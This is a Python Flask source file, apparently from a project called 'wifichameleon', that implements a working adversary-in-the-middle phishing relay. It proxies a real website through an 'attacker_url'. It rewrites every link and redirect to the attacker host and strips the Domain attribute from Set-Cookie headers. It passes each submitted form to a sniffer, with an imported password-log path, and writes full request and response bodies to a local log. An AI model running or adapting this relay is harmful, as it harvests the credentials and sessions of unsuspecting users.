from flask import Flask, request, Response
import requests
from urllib.parse import urlparse
import re
import json
from wifichameleon.utils import util
from wifichameleon.config import PROJ_ROOT, PASSWORD_LOG, RELAY_CACHE
from wifichameleon.relay.sniffer import do_sniff

app = Flask(__name__)
settings = util.read_settings()
real_url = settings['real_url']
attacker_url = settings['attacker_url']
attacker_netloc = urlparse(attacker_url).netloc
real_netloc = urlparse(real_url).netloc
url_to_id = {}
id_to_url = {}

methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"]

def is_netloc_chr(num):
    return (48 <= num and num <= 58) or (65 <= num and num <= 90) or (97 <= num and num <= 122) or num == 46

def load_cache():
    url_to_id = util.safe_json_loads(util.safe_read(PROJ_ROOT+RELAY_CACHE))
    id_to_url = {}
    for key in url_to_id.keys():
        id_to_url[url_to_id[key]] = key
    return url_to_id, id_to_url

def write_cache(url_to_id):
    with open(PROJ_ROOT+RELAY_CACHE, 'w') as ofile:
        ofile.write(json.dumps(url_to_id))

def replace_netloc(body):
    current_location = 0
    written = False
    url_to_id, id_to_url = load_cache()
    while True:
        current_location = body.find(b"http", current_location)
        if current_location == -1:
            if written: write_cache(url_to_id)
            return body
        check_loc = current_location+(5 if body[current_location+4] == ord('s') else 4)
        if body[check_loc:check_loc+3] != b"://":
            current_location = check_loc
            continue
        begin_netloc = check_loc+3
        end_netloc = begin_netloc+1
        while is_netloc_chr(body[end_netloc]):
            end_netloc += 1
        url = body[current_location:end_netloc].decode()
        if url != attacker_url:
            if url not in url_to_id:
                url_id = len(url_to_id)
                url_to_id[url] = url_id
                id_to_url[url_id] = url
                written = True
            else:
                url_id = url_to_id[url]
            append_str = f"{attacker_url}/page_{url_id}"
            body = body[:current_location] + append_str.encode() + body[end_netloc:]
        current_location = begin_netloc

def do_request(url, headers, query, method, body, path):
    r = requests.request(method, headers=headers, url=url+"/"+path, data=body, params=query, verify=False, stream=True, allow_redirects=False)
    headers = r.headers
    length = 0
    # Handle redirect
    if 'Location' in headers:
        # headers['Location'] = headers['Location'].replace(real_netloc, attacker_netloc)
        headers['Location'] = replace_netloc(headers['Location'].encode()).decode()
    # Handle body
    if 'Content-Length' in headers:
        length = int(headers['Content-Length'])
        del headers['Content-Length']
    # Handle cookie
    if 'Set-Cookie' in headers:
        _cookie = headers['Set-Cookie']
        begin_domain = _cookie.find("Domain=")
        if begin_domain != -1:
            end_domain = _cookie.find(";", begin_domain)
            headers['Set-Cookie'] = headers['Set-Cookie'][:begin_domain] + headers['Set-Cookie'][end_domain+1:]
    body = b""
    if length > 0:
        body = r.raw.read(length)
    elif 'Transfer-Encoding' in headers and headers['Transfer-Encoding'] == 'chunked':
        body = b''.join(r.iter_content())
    if len(body) > 0:
        with open("/home/pi/WiFi-Chameleon/data/test.log", 'a') as ofile:
            ofile.write(f"{method} {url} {path} {query} {headers} {body}\n")
        if 'Content-Type' in headers and 'text' in headers['Content-Type']:
            body = replace_netloc(body)
        else:
            body = body.replace(real_netloc.encode(), attacker_netloc.encode())
        with open("/home/pi/WiFi-Chameleon/data/test.log", 'a') as ofile:
            ofile.write(f"{body}\n")
        if 'Content-Encoding' in headers:
            del headers['Content-Encoding']
    resp = Response()
    resp.data = body
    for key in headers.keys():
        resp.headers[key] = headers[key]
    resp.status_code = r.status_code
    return resp

@app.route("/", methods=methods)
def home():
    path = ""
    headers = dict(request.headers)
    del headers['Host']
    query = dict(request.args)
    method = request.method
    body = dict(request.form)
    do_sniff(real_netloc, body)
    return do_request(real_url, headers, query, method, body, path)

@app.route('/<path:dummy>', methods=methods)
def fallback(dummy):
    path = dummy
    url = real_url
    if path[:5] == "page_":
        begin_real_path = path.find("/", 5)
        if begin_real_path == -1:
            begin_real_path = len(path)
        url_id = int(path[5:begin_real_path])
        id_to_url = load_cache()[1]
        url = id_to_url[url_id]
        path = path[begin_real_path+1:]
    headers = dict(request.headers)
    del headers['Host']
    query = dict(request.args)
    method = request.method
    body = dict(request.form)
    do_sniff(urlparse(url).netloc, body)
    return do_request(url, headers, query, method, body, path)